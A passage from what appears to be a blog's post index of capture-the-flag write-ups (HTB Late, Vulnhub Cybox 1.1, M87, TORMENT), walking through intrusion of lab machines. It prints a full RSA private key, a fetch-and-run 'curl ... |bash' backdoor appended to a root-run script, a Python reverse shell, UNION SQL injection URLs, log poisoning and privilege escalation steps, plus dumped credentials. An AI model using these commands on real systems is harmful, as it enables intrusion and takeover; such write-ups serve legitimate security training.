KEY-----MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrMHiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEObgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB77IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLMfLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgzW0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZuFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwCT9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IHQl49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troiWEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7NgHr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIEuJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQGUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8Fry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMbVh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfrkr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oALK6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==-----END RSA PRIVATE KEY-----Used the id_rsa to connect to the user.──(kali㉿kali)-[~/htb/late]└─$ chmod 600 id_rsa ┌──(kali㉿kali)-[~/htb/late]└─$ ssh -i id_rsa svc_acc@late.htbsvc_acc@late:~$ROOTI have checked the each dir for a file which are own by user svc_acc. in /usr dir I have found one file.svc_acc@late:~$ find / -user  svc_acc 2&gt;/dev/null | grep /usr/usr/local/sbin/usr/local/sbin/ssh-alert.sh/usr/local/sbin/ssh-alert.sh:#!/bin/bashRECIPIENT=\"root@late.htb\"SUBJECT=\"Email from Server Login: SSH Alert\"BODY=\"A SSH login was detected.        User:        $PAM_USER        User IP Host: $PAM_RHOST        Service:     $PAM_SERVICE        TTY:         $PAM_TTY        Date:        `date`        Server:      `uname -a`\"if [ ${PAM_TYPE} = \"open_session\" ]; then        echo \"Subject:${SUBJECT} ${BODY}\" | /usr/sbin/sendmail ${RECIPIENT}fiWe can not write the content to the file.svc_acc@late:~$ ls -l /usr/local/sbin/ssh-alert.sh-rwxr-xr-x 1 svc_acc svc_acc 433 Aug  1 11:16 /usr/local/sbin/ssh-alert.shWe can append the content to the file.svc_acc@late:~$ echo \" curl http://10.10.14.47/ |bash\" &gt;&gt; /usr/local/sbin/ssh-alert.shsvc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh#!/bin/bashRECIPIENT=\"root@late.htb\"SUBJECT=\"Email from Server Login: SSH Alert\"BODY=\"A SSH login was detected.        User:        $PAM_USER        User IP Host: $PAM_RHOST        Service:     $PAM_SERVICE        TTY:         $PAM_TTY        Date:        `date`        Server:      `uname -a`\"if [ ${PAM_TYPE} = \"open_session\" ]; then        echo \"Subject:${SUBJECT} ${BODY}\" | /usr/sbin/sendmail ${RECIPIENT}fi curl http://10.10.14.47/ |bashThis file will trigger when we try to login through ssh."
  },
  
  {
    "title": "Cybox:1.1 Vulnhub Writeup",
    "url": "/posts/Cybox-1.1-Vulnhub-Writeup/",
    "categories": "vulnhub, Medium",
    "tags": "lfi, log poisoning, subdomain",
    "date": "2021-01-10 00:00:00 +0530",
    





    "snippet": "To solve Cybox 1.1, we’ll find subdomains. First, we create the user on the register.cybox.company subdomain, then with the email id of the created user we create another account on monitor.cybox.company. This subdomain has a password reset option. We used that option to reset the password of admin. Admin panel has LFI vulnerability drives us towards a web shell via log poisoning.Once we land a shell, we search for SUID binaries and priv esc to root by creating the sudo user.Summary  Portscan  Finding Subdomains  Create the user on register.cybox.company  Reset the password of admin  Local File Inclusion  RCE via Log Poisoning  User Flag  Privesc  Root FlagReconNmapPORT    STATE SERVICE    VERSION21/tcp  open  ftp        vsftpd 3.0.325/tcp  open  smtp       Postfix smtpd|_smtp-commands: cybox.Home, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, | ssl-cert: Subject: commonName=cybox| Issuer: commonName=cybox| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2020-11-10T23:31:36| Not valid after:  2030-11-08T23:31:36| MD5:   597f 372b e5a8 d37c 0b02 df9b b844 c7fc|_SHA-1: baab 1a0e b21f b0d1 dfa3 344d cfe6 4596 eeeb 2b53|_ssl-date: TLS randomness does not represent time80/tcp  open  http       Apache httpd 2.2.17 ((Unix) mod_ssl/2.2.17 OpenSSL/0.9.8o DAV/2 PHP/5.2.15)|_http-favicon: Unknown favicon MD5: 8B6163E0FDACC85E807F80A78F59C03C| http-methods: |   Supported Methods: GET HEAD POST OPTIONS TRACE|_  Potentially risky methods: TRACE|_http-server-header: Apache/2.2.17 (Unix) mod_ssl/2.2.17 OpenSSL/0.9.8o DAV/2 PHP/5.2.15|_http-title: CYBOX110/tcp open  pop3       Courier pop3d|_pop3-capabilities: IMPLEMENTATION(Courier Mail Server) TOP PIPELINING UIDL USER LOGIN-DELAY(10)143/tcp open  imap       Courier Imapd (released 2011)|_imap-capabilities: ACL2=UNIONA0001 IMAP4rev1 SORT QUOTA CHILDREN completed IDLE CAPABILITY THREAD=ORDEREDSUBJECT THREAD=REFERENCES OK ACL NAMESPACE UIDPLUS443/tcp open  ssl/https?|_ssl-date: 2021-01-06T05:54:34+00:00; -2s from scanner time.| sslv2: |   SSLv2 supported|   ciphers: |     SSL2_RC4_128_WITH_MD5|     SSL2_DES_192_EDE3_CBC_WITH_MD5|     SSL2_DES_64_CBC_WITH_MD5|     SSL2_RC2_128_CBC_WITH_MD5|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5|_    SSL2_RC4_128_EXPORT40_WITH_MD5Service Info: Host:  cybox.Home; OS: UnixHost script results:|_clock-skew: -2sFinding hostnameThe main page of the website has an email address of the admin at the bottom. So we can guess the hostname i.e cybox.company.Add the hostname in /etc/hosts file. So we can use a hostname instead of IP address.SubdomainsI used gobuster to findout subdomains.$gobuster vhost -w ~/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cybox.company -o vhost.out===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:          http://cybox.company[+] Threads:      10[+] Wordlist:     /home/hitesh/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt[+] User Agent:   gobuster/3.0.1[+] Timeout:      10s===============================================================2021/01/10 17:31:01 Starting gobuster===============================================================Found: dev.cybox.company (Status: 200) [Size: 209]Found: webmail.cybox.company (Status: 302) [Size: 0]Found: monitor.cybox.company (Status: 302) [Size: 0]Found: register.cybox.company (Status: 200) [Size: 1252]Found: ftp.cybox.company (Status: 200) [Size: 5295]Now we have total 5 subdomains.I checked all the subdomains one by one.dev.cybox.companyIt contains only one file, phpinfo.php.webmail.cybox.companyOn this subdomain SquirrelMail v1.4.22 is installed.monitor.cybox.companyHere we have have login, register panel and password reset options.register.cybox.companyThis subdomain allows create new user.ftp.cybox.companyWe have ftp server here.Getting Admin accessWe can create new user on register.cybox.company.I created a new user with username terminal.email       : terminal@cybox.companyusername    : terminalpassword    : terminalUsing the same email and username, I created an account on monitor.cybox.company.The reset password sends the email to webmail.cybox.company.The password reset link is sent by email. We can access the mail by login into webmail.cybox.company with a username and password terminal:terminal.Open the link and change the mail from terminal@cybox.company to admin@cybox.company and reset the password of admin.Now we can access the Admin panel of monitor.cybox.company.Local File InclusionI checked the source code of /admin.&lt;html&gt;&lt;head&gt;\t&lt;meta charset=\"utf-8\"&gt;\t&lt;title&gt;Admin panel - Monitor&lt;/title&gt;\t&lt;link href=\"styles.php?style=general\" type=\"text/css\" rel=\"stylesheet\"&gt;&lt;/head&gt;&lt;body&gt;\t&lt;h1&gt;Admin panel&lt;/h1&gt;\t&lt;div class=\"construction\"&gt;&lt;/div&gt;\t&lt;h1&gt;Under construction&lt;/h1&gt;\t&lt;a href=\"../index.php\"&gt;Home&lt;/a&gt; | &lt;a href=\"../logout.php\"&gt;Sign out&lt;/body&gt;&lt;/html&gt;The styles.php has style as a get parameter which is used to get the files from server. This parameter is vulnerable to LFI attack using NULL byte.LFI to RCE using Log PoisoningLog Poisoning is a common technique used to gain a reverse shell from an LFI vulnerability. To make it work an attacker attempts to inject malicious input into the server log. For that, we need to access the log file.The server is installed in /opt. There fore the log file location is /opt/bitnami/apache2/logs/access_logWhen we access the log file we can see that it contain logs of only ftp.cybox.company.Inject the PHP codeInject the php code in User-Agent of ftp.cybox.company.Access the payload from /opt/bitnami/apache2/logs/access_log and append cmd parameter for command injection.Now get the reverse shell.python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.107\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'$sudo nc -nvlp 443listening on [any] 443 ...connect to [192.168.0.107] from (UNKNOWN) [192.168.0.108] 42864/bin/sh: 0: can't access tty; job control turned off$ lsindex.phpstylesstyles.php$ python -c 'import pty;pty.spawn(\"/bin/bash\")'python: /opt/bitnami/common/lib/libz.so.1: no version information available (required by python)daemon@cybox:/opt/bitnami/apache2/htdocs/monitor/admin$ ^Z[1]+  Stopped                 sudo nc -nvlp 443┌─[✗]─[hitesh@parrot]─[~]└──╼ $stty raw -echo┌─[hitesh@parrot]─[~]└──╼ $sudo nc -nvlp 443daemon@cybox:/opt/bitnami/apache2/htdocs/monitor/admin$User Flagdaemon@cybox:/home/cybox$ cat user.txt d85da08f1a31ef96fb6d4f608611bca2PrivescLooking at SUID files, /opt/registerlauncher seem suspicious to me.daemon@cybox:/$ find / -perm -4000 2&gt;/dev/null/usr/bin/chfn/usr/bin/chsh/usr/bin/newgidmap/usr/bin/passwd/usr/bin/sudo/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/newuidmap/usr/bin/pkexec/usr/bin/at/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/i386-linux-gnu/lxc/lxc-user-nic/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/snapd/snap-confine/opt/registerlauncher/bin/mount/bin/ping/bin/fusermount/bin/umount/bin/ping6/bin/su/bin/ntfs-3gThe program just seems to be running /opt/register binaray.daemon@cybox:/opt$ strings registerlauncher strings: /opt/bitnami/common/lib/libz.so.1: no version information available (required by /usr/lib/i386-linux-gnu/libbfd-2.26.1-system.so)/lib/ld-linux.so.2Tv ulibc.so.6_IO_stdin_usedsetuidexeclp__libc_start_main__gmon_start__GLIBC_2.0PTRhQVh;UWVSt$,U[^_]register/opt/register;*2$\"0GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609crtstuff.c__JCR_LIST__deregister_tm_clones__do_global_dtors_auxcompleted.7209__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryregisterlauncher.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable__x86.get_pc_thunk.bx_edataexeclp@@GLIBC_2.0__data_start__gmon_start____dso_handle_IO_stdin_used__libc_start_main@@GLIBC_2.0__libc_csu_init_fp_hw__bss_startmainsetuid@@GLIBC_2.0_Jv_RegisterClasses__TMC_END___ITM_registerTMCloneTable.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rel.dyn.rel.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.plt.data.bss.commentThe register binary:daemon@cybox:/opt$ strings registerstrings: /opt/bitnami/common/lib/libz.so.1: no version information available (required by /usr/lib/i386-linux-gnu/libbfd-2.26.1-system.so)#!/bin/bashUSERNAME=$1if [ ! \"$USERNAME\" ]hen    /bin/echo -e \"Syntax: Username\"    exit 1if [[ \"$USERNAME\" =~ [^a-z] ]]; then   /bin/echo -e \"Think twice before putting something :)\"   exit 0if /usr/bin/id \"$USERNAME\" &gt;/dev/null 2&gt;&amp;1; then    /bin/echo -e \"User already exists :(\"    exit 0if [ ! \"$(/bin/cat /etc/group | /bin/grep -w \"$USERNAME\")\" ]then    /usr/sbin/groupadd \"$USERNAME\" 2&gt;/dev/null/usr/sbin/useradd -p \"$(/usr/bin/openssl passwd -1 \"$USERNAME\")\" -m \"$USERNAME\" -g \"$USERNAME\" -s /bin/bash 2&gt;/dev/null/usr/bin/maildirmake /home/\"$USERNAME\"/Maildir/ -R 2&gt;/dev/null/bin/chown \"$USERNAME\":\"$USERNAME\" /home/\"$USERNAME\"/Maildir/ -R 2&gt;/dev/nullif [ $? -eq 0 ]; then    /bin/echo -e \"$USERNAME@cybox.company has been created successfully. The credentials are $USERNAME:$USERNAME. You should change your default password for security.\"else    /bin/echo -e \"The string must contain a maximum of 32 characters.\"This code creates a user and adds it to the group with the same name. So we need to create a user with help of it we can elevate the privileges. i.e sudo.Now register the user sudo.aemon@cybox:/opt$ ./registerlauncher sudosudo@cybox.company has been created successfully. The credentials are sudo:sudo. You should change your default password for security.daemon@cybox:/opt$ su sudoPassword: To run a command as administrator (user \"root\"), use \"sudo &lt;command&gt;\".See \"man sudo_root\" for details.sudo@cybox:/opt$ sudo -l[sudo] password for sudo: Matching Defaults entries for sudo on cybox:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser sudo may run the following commands on cybox:    (ALL : ALL) ALLsudo@cybox:/opt$ sudo /bin/bashroot@cybox:/opt# lsbitnami  register  registerlauncherroot@cybox:/opt# cd /rootroot@cybox:/root# lsMaildir  root.txtRoot Flagroot@cybox:/root# cat root.txt 4c0183fdd736e2b8fb3f57ddbfa8ce36"
  },
  
  {
    "title": "M87 vulnhub Writeup",
    "url": "/posts/M87-Vulnhub-Writeup/",
    "categories": "vulnhub, Easy",
    "tags": "sqli, lfi, wfuzz",
    "date": "2020-11-29 00:00:00 +0530",
    





    "snippet": "M87 was an easy box. It start with finding directories. Then we fuzz the hidden parameters. id parameter was vulnerable to sqli and file vulnerable to LFI. With this two vulnerabilities we find out usernames and passwords. Using port 9090 we get the shell on box. Privesc to root by using capabilities. In this blog I tried to explain how to dump data manually.Summary  Portscan  Running gobuster  Fuzzing parameters  Dump database  Local File Inclusion  Loggin to Port 9090  Getting Reverse shell  User Flag  Privsec to Root  Final FlagReconPortscanNmap scan report for 192.168.0.2Host is up (0.00027s latency).Not shown: 997 closed portsPORT     STATE    SERVICE         VERSION22/tcp   filtered ssh80/tcp   open     http            Apache httpd 2.4.38 ((Debian))|_http-server-header: Apache/2.4.38 (Debian)|_http-title: M87 Login Form9090/tcp open     ssl/zeus-admin?| fingerprint-strings: |   GetRequest, HTTPOptions: |     HTTP/1.1 400 Bad request|     Content-Type: text/html; charset=utf8|     Transfer-Encoding: chunked|     X-DNS-Prefetch-Control: off|     Referrer-Policy: no-referrer|     X-Content-Type-Options: nosniff|     Cross-Origin-Resource-Policy: same-origin|     &lt;!DOCTYPE html&gt;|     &lt;html&gt;|     &lt;head&gt;|     &lt;title&gt;|     request|     &lt;/title&gt;|     &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"&gt;|     &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;|     &lt;style&gt;|     body {|     margin: 0;|     font-family: \"RedHatDisplay\", \"Open Sans\", Helvetica, Arial, sans-serif;|     font-size: 12px;|     line-height: 1.66666667;|     color: #333333;|     background-color: #f5f5f5;|     border: 0;|     vertical-align: middle;|     font-weight: 300;|_    margin: 0 0 10p| ssl-cert: Subject: commonName=M87/organizationName=662b442c19a840e482f9f69cde8f316e| Subject Alternative Name: IP Address:127.0.0.1, DNS:localhost| Not valid before: 2020-11-06T13:05:35|_Not valid after:  2021-11-06T13:05:35|_ssl-date: TLS randomness does not represent timeWebsite Recon:We have login page on the website. The forgot password link is not functional (it points to /#).GobusterI spend some time on login page to find out vulnerabilities, but no luck. So I used gobuster to find out directories.$gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.223/ -o main-go.out===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:            http://192.168.1.223/[+] Threads:        10[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Status codes:   200,204,301,302,307,401,403[+] User Agent:     gobuster/3.0.1[+] Timeout:        10s===============================================================2020/11/29 12:33:45 Starting gobuster===============================================================/admin (Status: 301)/assets (Status: 301)/LICENSE (Status: 200)/server-status (Status: 403)Here I found /admin dir which is another login page.Again I run gobuster on /admin dir and found one /backup dir.$gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.223/admin/ -o admin-go.out===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:            http://192.168.1.223/admin/[+] Threads:        10[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Status codes:   200,204,301,302,307,401,403[+] User Agent:     gobuster/3.0.1[+] Timeout:        10s===============================================================2020/11/29 12:34:21 Starting gobuster===============================================================/images (Status: 301)/css (Status: 301)/js (Status: 301)/backup (Status: 301)Here we found another login page.Till now we have 3 login pages  http://192.168.1.223/  http://192.168.1.223/admin/  http://192.168.1.223/admin/backup/Finding parametersNow I tried to fuzz more parameter on each page using wfuzz. Here I used SecLists/Discovery/Web-Content/burp-parameter-names.txt wordlist to fuzz.$wfuzz --hw 161 -w ~/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.1.223/admin/backup/?FUZZ=Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.********************************************************* Wfuzz 2.4.5 - The Web Fuzzer                         *********************************************************Target: http://192.168.1.223/admin/backup/?FUZZ=Total requests: 2588===================================================================ID           Response   Lines    Word     Chars       Payload        ===================================================================000000001:   200        87 L     190 W    4560 Ch     \"id\"           Total time: 5.490480Processed Requests: 2588Filtered Requests: 2587Requests/sec.: 471.3613Great, we found new parameter id on http://192.168.1.223/admin/backup/?id=.When I open the url (http://192.168.1.223/admin/backup/?id=) in browser it shows the mysql error.Sql InjectionNow I started to dump the data from server.You can use sqlmap to dump the data, but here I dumped all data manually.i) Finding total number of COLUMNS used in sql query.To find out total number of columns in sql query I used order by.http://192.168.1.223/admin/backup/?id=99 or 1=2 order by 1http://192.168.1.223/admin/backup/?id=99 or 1=2 order by 2ii) Database Name:http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select database())iii) Now get Tables Names.To find out the table names we need to query table tables which is part of information schema database.http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select table_name from information_schema.tables where table_schema='db' limit 0,1)We found 1 table: usersiv) Extract the columns of table users:http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select column_name from information_schema.columns where table_schema='db' and table_name='users' limit 0,1)http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select column_name from information_schema.columns where table_schema='db' and table_name='users' limit 1,1)http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select column_name from information_schema.columns where table_schema='db' and table_name='users' limit 2,1)http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select column_name from information_schema.columns where table_schema='db' and table_name='users' limit 3,1)The columns of table users are:  id  email  username  passwordv) Dumping all dataThe following payload extract first entry from table. In order to dump all the data we need to increase limit squentially.http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select concat(id,\" \",email,\" \",username,\" \",password) from users limit 0,1)In this way you can extract all the data from mysql database manually.The final table is:            Id      Email      Password      Username                  1      jack@localhost      gae5g5a      jack              2      ceo@localhost      5t96y4i95y      ceo              3      brad@localhost      gae5g5a      brad              4      expenses@localhost      5t96y4i95y      expenses              5      julia@localhost      fw54vrfwe45      julia              6      mike@localhost      4kworw4      mike              7      adrian@localhost      fw54vrfwe45      adrian              8      john@localhost      4kworw4      john              9      admin@localhost      15The4Dm1n4L1f3      admin              10      alex@localhost      dsfsrw4      alex      I tired this creds on different login panels but no luck.LFIWith another parameter file we can read local files.Here we found system user charlotte.Port 9090On port 9090 we have login page.Here I tried username charlotte and password 15The4Dm1n4L1f3 to login.Now we can access terminal.Reverse ShellNow we can get reverse shell using the terminal window.┌─[hitesh@parrot]─[~/boxes/vulnhub/m87]└──╼ $nc -nvlp 4444listening on [any] 4444 ...connect to [192.168.1.222] from (UNKNOWN) [192.168.1.223] 32832python -c 'import pty;pty.spawn(\"/bin/bash\")'charlotte@M87:~$ ^Z[1]+  Stopped                 nc -nvlp 4444┌─[✗]─[hitesh@parrot]─[~/boxes/vulnhub/m87]└──╼ $stty raw -echo┌─[hitesh@parrot]─[~/boxes/vulnhub/m87]└──╼ $nc -nvlp 4444charlotte@M87:~$ export TERM=xtermcharlotte@M87:~$ Flag 1charlotte@M87:~$ cat local.txt 29247ebdec52ba0b9a6fd10d68f6b91fPrivesc to RootI upload linpeas.sh on box and run it.[+] Capabilities/usr/bin/old = cap_setuid+ep/usr/bin/ping = cap_net_raw+ep/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+epWe found that /usr/bin/old have cap_setuid capabilities.When I run the /usr/bin/old found that it running python.charlotte@M87:~$ /usr/bin/oldPython 2.7.16 (default, Oct 10 2019, 22:02:15) [GCC 8.3.0] on linux2Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.&gt;&gt;&gt; Now it’s very easy to launch the shell using python as root user.&gt;&gt;&gt; import os&gt;&gt;&gt; os.setuid(0)&gt;&gt;&gt; os.system('/bin/bash')root@M87:~# Root Flagroot@M87:/root# cat proof.txt MMMMMMMM               MMMMMMMM     888888888     77777777777777777777M:::::::M             M:::::::M   88:::::::::88   7::::::::::::::::::7M::::::::M           M::::::::M 88:::::::::::::88 7::::::::::::::::::7M:::::::::M         M:::::::::M8::::::88888::::::8777777777777:::::::7M::::::::::M       M::::::::::M8:::::8     8:::::8           7::::::7M:::::::::::M     M:::::::::::M8:::::8     8:::::8          7::::::7M:::::::M::::M   M::::M:::::::M 8:::::88888:::::8          7::::::7M::::::M M::::M M::::M M::::::M  8:::::::::::::8          7::::::7M::::::M  M::::M::::M  M::::::M 8:::::88888:::::8        7::::::7M::::::M   M:::::::M   M::::::M8:::::8     8:::::8      7::::::7M::::::M    M:::::M    M::::::M8:::::8     8:::::8     7::::::7M::::::M     MMMMM     M::::::M8:::::8     8:::::8    7::::::7M::::::M               M::::::M8::::::88888::::::8   7::::::7M::::::M               M::::::M 88:::::::::::::88   7::::::7M::::::M               M::::::M   88:::::::::88    7::::::7MMMMMMMM               MMMMMMMM     888888888     77777777Congratulations!You've rooted m87!21e5e63855f249bcd1b4b093af669b1emindsflee"
  },
  
  {
    "title": "Digitalworld Local: TORMENT Writeup",
    "url": "/posts/TORMENT-Writeup/",
    "categories": "vulnhub, Digitalworld Local",
    "tags": "ngircd, python",
    "date": "2020-09-17 00:00:00 +0530",
    





    "snippet": "Torment is enumeration focued box. It’s like collecting pieces and forming a picture. We get ssh private key from ftp server, usernames from port 631 and 25, and password from Ngircd. With this information we log in as user patrick. We escalate to another user using apache2.conf and priv esc to root by using python binary.Summary  Portscan  FTP Enumeration  Finding users  Validating users using SMTP  Finding password  SSH  User Patrick  User Qiu  FlagReconPortscanPORT     STATE SERVICE     VERSION21/tcp   open  ftp         vsftpd 2.0.8 or later| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-r--r--    1 ftp      ftp        112640 Dec 28  2018 alternatives.tar.0| -rw-r--r--    1 ftp      ftp          4984 Dec 23  2018 alternatives.tar.1.gz| -rw-r--r--    1 ftp      ftp         95760 Dec 28  2018 apt.extended_states.0| -rw-r--r--    1 ftp      ftp         10513 Dec 27  2018 apt.extended_states.1.gz| -rw-r--r--    1 ftp      ftp         10437 Dec 26  2018 apt.extended_states.2.gz| -rw-r--r--    1 ftp      ftp           559 Dec 23  2018 dpkg.diversions.0| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.1.gz| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.2.gz| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.3.gz| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.4.gz| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.5.gz| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.6.gz| -rw-r--r--    1 ftp      ftp           505 Dec 28  2018 dpkg.statoverride.0| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.1.gz| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.2.gz| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.3.gz| -rw-r--r--    1 ftp      ftp           281 Dec 27  2018 dpkg.statoverride.4.gz| -rw-r--r--    1 ftp      ftp           208 Dec 23  2018 dpkg.statoverride.5.gz| -rw-r--r--    1 ftp      ftp           208 Dec 23  2018 dpkg.statoverride.6.gz| -rw-r--r--    1 ftp      ftp       1719127 Jan 01  2019 dpkg.status.0|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.| ftp-syst: |   STAT: | FTP server status:|      Connected to ::ffff:192.168.1.2|      Logged in as ftp|      TYPE: ASCII|      No session bandwidth limit|      Session timeout in seconds is 300|      Control connection is plain text|      Data connections will be plain text|      At session startup, client count was 2|      vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)| ssh-hostkey: |   2048 84:c7:31:7a:21:7d:10:d3:a9:9c:73:c2:c2:2d:d6:77 (RSA)|   256 a5:12:e7:7f:f0:17:ce:f1:6a:a5:bc:1f:69:ac:14:04 (ECDSA)|_  256 66:c7:d0:be:8d:9d:9f:bf:78:67:d2:bc:cc:7d:33:b9 (ED25519)25/tcp   open  smtp        Postfix smtpd|_smtp-commands: TORMENT.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, | ssl-cert: Subject: commonName=TORMENT| Subject Alternative Name: DNS:TORMENT| Not valid before: 2018-12-23T14:28:47|_Not valid after:  2028-12-20T14:28:47|_ssl-date: TLS randomness does not represent time80/tcp   open  http        Apache httpd 2.4.25|_http-server-header: Apache/2.4.25|_http-title: Apache2 Debian Default Page: It works111/tcp  open  rpcbind     2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100003  3,4         2049/tcp   nfs|   100003  3,4         2049/tcp6  nfs|   100003  3,4         2049/udp   nfs|   100003  3,4         2049/udp6  nfs|   100005  1,2,3      39868/udp6  mountd|   100005  1,2,3      50240/udp   mountd|   100005  1,2,3      58479/tcp   mountd|   100005  1,2,3      60895/tcp6  mountd|   100021  1,3,4      35655/tcp   nlockmgr|   100021  1,3,4      43910/udp6  nlockmgr|   100021  1,3,4      44487/tcp6  nlockmgr|   100021  1,3,4      56220/udp   nlockmgr|   100227  3           2049/tcp   nfs_acl|   100227  3           2049/tcp6  nfs_acl|   100227  3           2049/udp   nfs_acl|_  100227  3           2049/udp6  